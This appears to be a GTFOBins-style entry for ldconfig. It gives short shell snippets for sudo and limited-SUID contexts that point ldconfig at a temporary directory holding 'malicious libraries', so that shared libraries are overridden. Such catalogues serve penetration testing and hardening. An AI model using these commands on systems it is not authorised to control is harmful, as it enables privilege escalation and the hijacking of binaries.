sudo.description: This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.
sudo.code:
TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
sudo ldconfig -f "$TF/conf"

limited-suid.description: This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.
limited-suid.code:
TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
./ldconfig -f "$TF/conf"
